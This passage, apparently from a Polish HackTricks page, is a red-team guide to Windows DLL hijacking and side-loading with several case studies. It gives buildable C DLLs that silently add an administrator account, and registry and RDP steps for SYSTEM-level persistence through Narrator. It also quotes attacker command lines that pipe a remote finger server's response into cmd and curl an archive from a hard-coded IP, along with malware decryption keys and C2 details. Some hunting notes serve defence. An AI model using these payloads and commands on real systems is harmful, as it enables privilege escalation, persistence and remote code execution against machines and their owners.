// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
if (dwReason == DLL_PROCESS_ATTACH){
system("cmd.exe /k net localgroup administrators user /add");
ExitProcess(0);
}
return TRUE;
}
```
<details>
<summary>Przykład DLL w C++ z tworzeniem użytkownika</summary>
```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
exit(0);
return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
owned();
return 0;
}
```
</details>

<details>
<summary>Alternatywna biblioteka DLL w C z punktem wejścia wątku</summary>
```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
switch (ul_reason_for_call){
case DLL_PROCESS_ATTACH:
CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
break;
case DLL_THREAD_ATTACH:
case DLL_THREAD_DETACH:
case DLL_PROCESS_DEATCH:
break;
}
return TRUE;
}
```
</details>

## Studium przypadku: DLL Hijack lokalizacyjnego Narrator OneCore TTS (Accessibility/ATs)

Windows Narrator.exe nadal podczas uruchamiania wyszukuje przewidywalną, zależną od języka lokalizacyjną DLL, którą można przejąć w celu wykonania dowolnego kodu i utrzymania persystencji.<sup>[[7]](#references)</sup>

Najważniejsze informacje
- Ścieżka wyszukiwania (obecne buildy): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Starsza ścieżka (starsze buildy): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- Jeśli pod ścieżką OneCore istnieje zapisywalna DLL kontrolowana przez atakującego, zostaje załadowana, a `DllMain(DLL_PROCESS_ATTACH)` zostaje wykonane. Eksporty nie są wymagane.

Wykrywanie za pomocą Procmon
- Filtr: `Process Name is Narrator.exe` oraz `Operation is Load Image` lub `CreateFile`.
- Uruchom Narrator i obserwuj próbę załadowania powyższej ścieżki.

Minimalna DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
// Optional OPSEC: DisableThreadLibraryCalls(h);
// Suspend/quiet Narrator main thread, then run payload
// (see PoC for implementation details)
}
return TRUE;
}
```
OPSEC - cisza
- Naiwny hijack będzie mówić/podświetlać interfejs użytkownika. Aby zachować ciszę, podczas dołączania wylicz wątki Narrator, otwórz główny wątek (`OpenThread(THREAD_SUSPEND_RESUME)`) i wstrzymaj go za pomocą `SuspendThread`; kontynuuj działanie we własnym wątku. Pełny kod znajdziesz w PoC.<sup>[[8]](#references)</sup>

Wyzwalanie i persistence za pośrednictwem konfiguracji Accessibility
- Kontekst użytkownika (HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM (HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Powyższa konfiguracja powoduje, że uruchomienie Narrator ładuje umieszczoną DLL. Na secure desktop (ekranie logowania) naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; Twoja DLL wykona się jako SYSTEM na secure desktop.

Wykonanie jako SYSTEM wyzwalane przez RDP (lateral movement)
- Zezwól na klasyczną warstwę zabezpieczeń RDP: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- Połącz się z hostem przez RDP, a na ekranie logowania naciśnij CTRL+WIN+ENTER, aby uruchomić Narrator; Twoja DLL wykona się jako SYSTEM na secure desktop.
- Wykonanie zatrzyma się po zamknięciu sesji RDP — szybko wykonaj inject/migrate.

Bring Your Own Accessibility (BYOA)
- Możesz sklonować wpis rejestru wbudowanego narzędzia Accessibility (AT), np. CursorIndicator, edytować go tak, aby wskazywał dowolny plik binarny/DLL, zaimportować go, a następnie ustawić `configuration` na nazwę tego AT. Umożliwia to proxy dowolnego wykonania w ramach frameworka Accessibility.

Uwagi
- Zapis w `%windir%\System32` oraz zmiana wartości HKLM wymagają uprawnień administratora.
- Cała logika payloadu może znajdować się w `DLL_PROCESS_ATTACH`; eksporty nie są wymagane.

## Studium przypadku: CVE-2025-1729 - eskalacja uprawnień za pomocą TPQMAssistant.exe

Ten przypadek demonstruje **Phantom DLL Hijacking** w Lenovo TrackPoint Quick Menu (`TPQMAssistant.exe`), śledzone jako **CVE-2025-1729**.<sup>[[2]](#references)[[3]](#references)</sup>

### Szczegóły podatności

- **Komponent**: `TPQMAssistant.exe` znajdujący się w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
- **Scheduled Task**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask` uruchamia się codziennie o 9:30 w kontekście zalogowanego użytkownika.
- **Uprawnienia katalogu**: Zapisywalny przez `CREATOR OWNER`, co umożliwia użytkownikom lokalnym umieszczanie dowolnych plików.
- **Zachowanie wyszukiwania DLL**: Najpierw próbuje załadować `hostfxr.dll` z katalogu roboczego i rejestruje komunikat "NAME NOT FOUND", co wskazuje na priorytet wyszukiwania w katalogu lokalnym.

### Implementacja exploita

Atakujący może umieścić złośliwy stub `hostfxr.dll` w tym samym katalogu, wykorzystując brakującą DLL do uzyskania wykonania kodu w kontekście użytkownika:
```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
if (fdwReason == DLL_PROCESS_ATTACH) {
// Payload: display a message box (proof-of-concept)
MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
}
return TRUE;
}
```
### Przebieg ataku

1. Jako standardowy użytkownik umieść `hostfxr.dll` w `C:\ProgramData\Lenovo\TPQM\Assistant\`.
2. Poczekaj, aż zaplanowane zadanie uruchomi się o 9:30 w kontekście bieżącego użytkownika.
3. Jeśli podczas wykonywania zadania zalogowany jest administrator, złośliwa biblioteka DLL zostanie uruchomiona w sesji administratora z poziomem integralności medium.
4. Połącz standardowe techniki UAC bypass, aby podnieść uprawnienia z poziomu integralności medium do uprawnień SYSTEM.

## Studium przypadku: MSI CustomAction Dropper + DLL Side-Loading via Signed Host (wsc_proxy.exe)

Threat actors często łączą droppers bazujące na MSI z DLL side-loading, aby wykonywać payloady w ramach zaufanego, podpisanego procesu.<sup>[[10]](#references)</sup>

Przegląd łańcucha
- Użytkownik pobiera MSI. CustomAction uruchamia się po cichu podczas instalacji GUI (np. jako LaunchApplication lub akcja VBScript), odtwarzając kolejny etap z embedded resources.
- Dropper zapisuje legalny, podpisany EXE oraz złośliwą bibliotekę DLL w tym samym katalogu (przykładowa para: podpisany przez Avast wsc_proxy.exe + kontrolowany przez atakującego wsc.dll).
- Po uruchomieniu podpisanego EXE kolejność wyszukiwania bibliotek DLL w systemie Windows ładuje najpierw wsc.dll z katalogu roboczego, wykonując kod atakującego w ramach podpisanego procesu nadrzędnego (ATT&CK T1574.001).

Analiza MSI (czego szukać)
- Tabela CustomAction:
- Szukaj wpisów uruchamiających pliki wykonywalne lub VBScript. Przykładowy podejrzany wzorzec: LaunchApplication wykonujący embedded file w tle.
- W Orca (Microsoft Orca.exe) sprawdź tabele CustomAction, InstallExecuteSequence i Binary.
- Embedded/split payloads w MSI CAB:
- Ekstrakcja administracyjna: msiexec /a package.msi /qb TARGETDIR=C:\out
- Możesz też użyć lessmsi: lessmsi x package.msi C:\out
- Szukaj wielu małych fragmentów, które są łączone i odszyfrowywane przez CustomAction VBScript. Typowy przebieg:
```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```
Praktyczne sideloading z wsc_proxy.exe
- Umieść te dwa pliki w tym samym folderze:
- wsc_proxy.exe: legalny, podpisany host (Avast). Proces próbuje załadować wsc.dll po nazwie z własnego katalogu.
- wsc.dll: DLL atakującego. Jeśli nie są wymagane żadne konkretne eksporty, wystarczy DllMain; w przeciwnym razie zbuduj proxy DLL i przekaż wymagane eksporty do oryginalnej biblioteki, uruchamiając payload w DllMain.
- Zbuduj minimalny payload DLL:
```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
if (r == DLL_PROCESS_ATTACH) {
WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
}
return TRUE;
}
```
- W przypadku wymagań dotyczących exportów użyj frameworka proxying (np. DLLirant/Spartacus), aby wygenerować forwarding DLL, która dodatkowo wykonuje payload.

- Ta technika opiera się na rozwiązywaniu nazw DLL przez host binary. Jeśli host używa ścieżek bezwzględnych lub flag bezpiecznego ładowania (np. LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories), hijack może się nie powieść.
- KnownDLLs, SxS i forwarded exports mogą wpływać na kolejność wyszukiwania i należy je uwzględnić podczas wyboru host binary oraz zestawu exportów.

## Podpisane triady + zaszyfrowane payloady (studium przypadku ShadowPad)

Check Point opisał, jak Ink Dragon wdraża ShadowPad za pomocą **triady trzech plików**, aby upodobnić się do legalnego oprogramowania, jednocześnie utrzymując główny payload w postaci zaszyfrowanej na dysku:<sup>[[12]](#references)</sup>

1. **Signed host EXE** – wykorzystywani są dostawcy tacy jak AMD, Realtek lub NVIDIA (`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). Atakujący zmieniają nazwę pliku wykonywalnego, aby wyglądał jak binary systemu Windows (na przykład `conhost.exe`), ale podpis Authenticode pozostaje prawidłowy.
2. **Malicious loader DLL** – umieszczana obok EXE pod oczekiwaną nazwą (`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL jest zwykle binary MFC zaciemnionym za pomocą frameworka ScatterBrain; jej jedynym zadaniem jest znalezienie zaszyfrowanego bloba, odszyfrowanie go i reflectively mapowanie ShadowPad.
3. **Encrypted payload blob** – często przechowywany jako `<name>.tmp` w tym samym katalogu. Po zmapowaniu odszyfrowanego payloadu w pamięci loader usuwa plik TMP, aby zniszczyć ślady forensics.

Uwagi dotyczące Tradecraftu:

* Zmiana nazwy podpisanego EXE (przy zachowaniu oryginalnego `OriginalFileName` w nagłówku PE) pozwala mu udawać binary systemu Windows, a jednocześnie zachować podpis dostawcy, dlatego warto odtworzyć zwyczaj Ink Dragon polegający na umieszczaniu plików wyglądających jak `conhost.exe`, które w rzeczywistości są narzędziami AMD/NVIDIA.
* Ponieważ executable pozostaje zaufany, większość mechanizmów allowlisting musi jedynie dopuścić obecność złośliwej DLL obok niego. Skoncentruj się na dostosowaniu loader DLL; podpisany parent zazwyczaj może działać bez zmian.
* Decryptor ShadowPad oczekuje, że blob TMP będzie znajdował się obok loadera i będzie zapisywalny, aby mógł wyzerować plik po mapowaniu. Pozostaw katalog zapisywalny do czasu załadowania payloadu; po umieszczeniu go w pamięci plik TMP można bezpiecznie usunąć ze względów OPSEC.

### LOLBAS stager + łańcuch staged archive sideloading (finger → tar/curl → WMI)

Operatorzy łączą DLL sideloading z LOLBAS, dzięki czemu jedynym niestandardowym artefaktem na dysku jest złośliwa DLL umieszczona obok zaufanego EXE:<sup>[[1]](#references)</sup>

- **Remote command loader (Finger):** Ukryty PowerShell uruchamia `cmd.exe /c`, pobiera komendy z serwera Finger i przekazuje je do `cmd`:

```powershell
powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
```
- `finger user@host` pobiera tekst przez TCP/79; `| cmd` wykonuje odpowiedź serwera, pozwalając operatorom zmieniać second stage po stronie serwera.

- **Built-in download/extract:** Pobierz archiwum z nieszkodliwym rozszerzeniem, rozpakuj je i przygotuj target sideloadingu wraz z DLL w losowym katalogu `%LocalAppData%`:

```powershell
$base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
```
- `curl -s -L` ukrywa postęp i podąża za przekierowaniami; `tar -xf` używa wbudowanego w Windows programu tar.

- **WMI/CIM launch:** Uruchom EXE przez WMI, aby telemetria pokazywała proces utworzony przez CIM podczas ładowania colocated DLL:

```powershell
Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
```
- Działa z binary, które preferują lokalne DLL (np. `intelbq.exe`, `nearby_share.exe`); payload (np. Remcos) działa pod zaufaną nazwą.

- **Hunting:** Generuj alerty dla `forfiles`, gdy `/p`, `/m` i `/c` występują razem; poza skryptami administracyjnymi jest to rzadkie.


## Studium przypadku: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

Niedawna intruzja Lotus Blossom wykorzystywała zaufany łańcuch aktualizacji do dostarczenia droppera spakowanego przez NSIS, który przygotowywał DLL sideloading oraz payloady w całości działające w pamięci.<sup>[[13]](#references)</sup>

Przebieg Tradecraftu
- `update.exe` (NSIS) tworzy `%AppData%\Bluetooth`, oznacza go jako **HIDDEN**, umieszcza w nim zmienioną nazwę Bitdefender Submission Wizard `BluetoothService.exe`, złośliwą `log.dll` oraz zaszyfrowany blob `BluetoothService`, a następnie uruchamia EXE.
- Host EXE importuje `log.dll` i wywołuje `LogInit`/`LogWrite`. `LogInit` ładuje blob przez mmap; `LogWrite` odszyfrowuje go za pomocą stream cipher opartego na LCG (stałe **0x19660D** / **0x3C6EF35F**, materiał klucza wyprowadzony z wcześniejszego hasha), nadpisuje bufor plaintext shellcode'em, zwalnia dane tymczasowe i wykonuje skok do shellcode'u.
- Aby uniknąć IAT, loader rozwiązuje API przez hashowanie nazw exportów za pomocą **FNV-1a basis 0x811C9DC5 + prime 0x100019**, a następnie stosuje avalanche w stylu Murmur (**0x85EBCA6B**) i porównuje wynik z docelowymi hashami z solą.

Main shellcode (Chrysalis)
- Odszyfrowuje główny moduł podobny do PE, wielokrotnie wykonując add/XOR/sub z kluczem `gQ2JR&9;` w pięciu przejściach, a następnie dynamicznie ładuje `Kernel32.dll` → `GetProcAddress`, aby dokończyć rozwiązywanie importów.
- Odtwarza w runtime stringi nazw DLL za pomocą transformacji bit-rotate/XOR wykonywanych dla poszczególnych znaków, a następnie ładuje `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`.
- Używa drugiego resolvera, który przechodzi przez **PEB → InMemoryOrderModuleList**, parsuje każdą tabelę exportów w blokach po 4 bajty za pomocą mieszania w stylu Murmur i korzysta z `GetProcAddress` tylko wtedy, gdy hash nie zostanie znaleziony.

Embedded configuration & C2
- Konfiguracja znajduje się wewnątrz upuszczonego pliku `BluetoothService` przy **offset 0x30808** (rozmiar **0x980**) i jest odszyfrowywana przez RC4 z kluczem `qwhvb^435h&*7`, ujawniając URL C2 oraz User-Agent.
- Beacony tworzą rozdzielany kropkami profil hosta, dodają na początku tag `4Q`, a następnie szyfrują go przez RC4 z kluczem `vAuig34%^325hGV` przed wywołaniem `HttpSendRequestA` przez HTTPS. Odpowiedzi są odszyfrowywane przez RC4 i przekazywane do obsługi przez przełącznik tagów (`4T` shell, `4V` process exec, `4W/4X` file write, `4Y` read/exfil, `4\\` uninstall, `4` drive/file enum + przypadki chunked transfer).
- Tryb wykonania jest kontrolowany przez argumenty CLI: brak argumentów = instalacja persistence (service/Run key) wskazująca na `-i`; `-i` ponownie uruchamia siebie z `-k`; `-k` pomija instalację i uruchamia payload.

Alternate loader observed
- Ta sama intruzja umieszczała Tiny C Compiler i wykonywała `svchost.exe -nostdlib -run conf.c` z `C:\ProgramData\USOShared\`, z `libtcc.dll` obok. Dostarczony przez atakującego kod źródłowy C zawierał shellcode, który był kompilowany i uruchamiany w pamięci bez zapisywania pliku PE na dysku. Odtwórz to za pomocą:
```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```
- Ten oparty na TCC etap kompilacji i uruchamiania importował `Wininet.dll` w czasie wykonywania i pobierał second-stage shellcode z hardcoded URL, zapewniając elastyczny loader, który maskował się jako uruchomienie kompilatora.

## Signed-host sideloading with export proxying + host thread parking

Niektóre łańcuchy DLL sideloading dodają **stability engineering**, aby legalny host pozostał aktywny wystarczająco długo, by poprawnie załadować kolejne etapy, zamiast ulec awarii po załadowaniu złośliwej biblioteki DLL.<sup>[[11]](#references)</sup>

Zaobserwowany wzorzec
- Umieść zaufany plik EXE obok złośliwej biblioteki DLL, używając oczekiwanej nazwy zależności, takiej jak `version.dll`.
- Złośliwa biblioteka DLL **proxy'uje każdy oczekiwany export** do rzeczywistej systemowej biblioteki DLL (na przykład `%SystemRoot%\\System32\\version.dll`), dzięki czemu rozwiązywanie importów nadal kończy się powodzeniem, a proces hosta działa dalej.
- Po załadowaniu złośliwa biblioteka DLL **patchuje entry point hosta**, aby główny wątek wpadał w nieskończoną pętlę `Sleep`, zamiast kończyć działanie lub wykonywać ścieżki kodu prowadzące do zakończenia procesu.
- Nowy wątek wykonuje właściwe złośliwe działania: odszyfrowuje nazwę lub ścieżkę biblioteki DLL kolejnego etapu (`RC4`/`XOR` są powszechne), a następnie uruchamia ją za pomocą `LoadLibrary`.

Dlaczego ma to znaczenie
- Normalne proxy'owanie DLL zachowuje zgodność API, ale nie gwarantuje, że host pozostanie aktywny wystarczająco długo dla kolejnych etapów.
- Zaparkowanie głównego wątku w `Sleep(INFINITE)` to prosty sposób na utrzymanie podpisanego procesu w pamięci, podczas gdy loader wykonuje deszyfrowanie, staging lub bootstrap sieciowy w wątku roboczym.
- Samo wyszukiwanie podejrzanego `DllMain` może nie wykryć tego wzorca, jeśli interesujące zachowanie następuje po spatchowaniu entry pointu hosta i uruchomieniu wątku pomocniczego.

Minimalny workflow
1. Skopiuj podpisany plik EXE hosta i ustal, którą bibliotekę DLL rozwiązuje on z lokalnego katalogu.
2. Zbuduj proxy DLL eksportującą te same funkcje i przekazującą je do legalnej biblioteki DLL.
3. W `DllMain(DLL_PROCESS_ATTACH)` utwórz wątek roboczy.
4. Z tego wątku spatchuj entry point hosta lub procedurę startową głównego wątku tak, aby wykonywał pętlę opartą na `Sleep`.
5. Odszyfruj nazwę/konfigurację biblioteki DLL kolejnego etapu i wywołaj `LoadLibrary` lub wykonaj manual-map payloadu.

Punkty kontrolne dla obrony
- Podpisane procesy ładujące `version.dll` lub podobne popularne biblioteki z własnego katalogu aplikacji zamiast z `System32`.
- Patche pamięci w entry poincie procesu krótko po załadowaniu obrazu, szczególnie skoki/wywołania przekierowane do `Sleep`/`SleepEx`.
- Wątki tworzone przez proxy DLL, które natychmiast wywołują `LoadLibrary` dla drugiej biblioteki DLL z odszyfrowaną nazwą.
- Pełne proxy DLL eksportów umieszczone obok plików wykonywalnych dostawcy w zapisywalnych katalogach stagingowych, takich jak `ProgramData`, `%TEMP%` lub ścieżki wypakowanych archiwów.

## References

- [1] [Red Canary – Wnioski wywiadowcze: styczeń 2026](https://redcanary.com/blog/threat-intelligence/intelligence-insights-january-2026/)
- [2] [CVE-2025-1729 – eskalacja uprawnień za pomocą TPQMAssistant.exe](https://trustedsec.com/blog/cve-2025-1729-privilege-escalation-using-tpqmassistant-exe)
- [3] [Microsoft Store – TPQM Assistant UWP](https://apps.microsoft.com/detail/9mz08jf4t3ng)
- [4] [Pranay Bafna – TCAPT: DLL Hijacking](https://medium.com/@pranaybafna/tcapt-dll-hijacking-888d181ede8e)
- [5] [cocomelonc – DLL hijacking w Windows. Prosty przykład w C.](https://cocomelonc.github.io/pentest/2021/09/24/dll-hijacking-1.html)
- [6] [Check Point Research – Nimbus Manticore wdraża nowe malware atakujące Europę](https://research.checkpoint.com/2025/nimbus-manticore-deploys-new-malware-targeting-europe/)
- [7] [TrustedSec – Hack-cessibility: gdy DLL Hijacks spotykają windowsowych helperów](https://trustedsec.com/blog/hack-cessibility-when-dll-hijacks-meet-windows-helpers)
- [8] [PoC – api0cradle/Narrator-dll](https://github.com/api0cradle/Narrator-dll)
- [9] [Sysinternals Process Monitor](https://learn.microsoft.com/sysinternals/downloads/procmon)
- [10] [Unit 42 – Cyfrowi sobowtórowie: anatomia ewoluujących kampanii podszywania się dystrybuujących Gh0st RAT](https://unit42.paloaltonetworks.com/impersonation-campaigns-deliver-gh0st-rat/)
- [11] [Unit 42 – Zbieżne interesy: analiza klastrów zagrożeń atakujących rząd Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/espionage-campaigns-target-se-asian-government-org/)
- [12] [Check Point Research – Wewnątrz Ink Dragon: ujawnienie sieci przekaźnikowej i wewnętrznego działania skrytej operacji ofensywnej](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [13] [Rapid7 – Backdoor Chrysalis: szczegółowa analiza toolkit Lotus Blossom](https://www.rapid7.com/blog/post/tr-chrysalis-backdoor-dive-into-lotus-blossoms-toolkit)
- [14] [0xdf – HTB Bruno ZipSlip → łańcuch DLL hijack](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [15] [Unit 42 – Śledzenie kampanii szpiegowskich irańskiej grupy APT Screening Serpens z 2026 roku](https://unit42.paloaltonetworks.com/tracking-iran-apt-screening-serpens/)
- [16] [Microsoft Learn – element `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – element `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – element `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – element `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – element `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – element `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Szybcy i wściekli: działania Nimbus Manticore podczas konfliktu w Iranie](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – akcje zadań](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 atakuje rządy i infrastrukturę krytyczną Azji Południowo-Wschodniej](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
{{#include ../../../banners/hacktricks-training.md}}
